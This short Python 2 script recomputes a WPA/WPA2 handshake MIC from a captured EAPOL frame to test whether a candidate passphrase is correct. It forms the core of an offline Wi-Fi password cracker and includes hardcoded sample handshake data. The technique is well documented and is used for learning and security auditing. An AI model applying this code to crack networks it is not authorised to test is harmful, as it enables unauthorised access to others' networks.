import hmac
from hashlib import sha1
from binascii import a2b_hex
from pbkdf2_ctypes import pbkdf2_bin

def hmac4times(ptk, pke):
    r = ''
    for i in range(4):
        r += hmac.new(ptk, pke + chr(i), sha1).digest()
    return r        

def crackProcess(Ssid, Passphrase, ClientMac, APMac, ANonce, SNonce, Mic, Data):
	#Replace Mic in Data with zeros
	Data = Data.replace(Mic, "00000000000000000000000000000000")
	
	#apply a2b_hex
	ClientMac = a2b_hex(ClientMac)
	APMac = a2b_hex(APMac)
	ANonce = a2b_hex(ANonce)
	SNonce = a2b_hex(SNonce)
	Mic = a2b_hex(Mic)
	Data = a2b_hex(Data)
	
	#build pke
	pke = "Pairwise key expansion" + '\x00' + min(APMac,ClientMac)+max(APMac,ClientMac)+min(ANonce,SNonce)+max(ANonce,SNonce)     
	
	#generate pmk
	pmk = pbkdf2_bin(Passphrase, Ssid, 4096, 32)
	
	#calculate ptk
	ptk = hmac4times(pmk,pke)
	
	if ord(Data[6]) & 0b00000010 == 2:
		calculatedMic = hmac.new(ptk[0:16],Data,sha1).digest()[0:16]
	else:
		calculatedMic = hmac.new(ptk[0:16],Data).digest()

	if Mic == calculatedMic:
		return 1 #Correct password
	
	return 0 #Wrong password

		
		
ssid = "AP1"
password = "XXXXXXXXXXXXX"
clientMac = "2aa43c4d3ebc"
APMac = "705a0f6d8b4c"
ANounce = "7ef9d833dc23a767388bf7ff066d1c80beb04712da4d03a9de080a9d2c0c140a"
SNounce = "93cbdcaa444a259538dba15e5e24a3dda1bf1829468e754fe9171e970dcf6483"


#data = whole 802.1X Autehntication part of EAPOL packet
mic = "1efa13db259e15dc428edc391efd74e5"
data = "020300c70213ca0010000000000000001b7ef9d833dc23a767388bf7ff066d1c80beb04712da4d03a9de080a9d2c0c140a00000000000000000000000000000000840f52000000000000000000000000001efa13db259e15dc428edc391efd74e50068d5c26dbc650cf3c31466a235329e123377ab2546d4d988649bdaf4535539d505f52ff8e0059acd65f511c23b58aa5a8a4b52891b1a120faaaf071f37cfbe2f81b098cf225868d3ab439fd38a948cb7bf1ca8c55eaed1d0700ddcc19ad7cde2a45842b3b8ff9ad427"



print crackProcess(ssid, password, clientMac, APMac, ANounce, SNounce, mic, data)
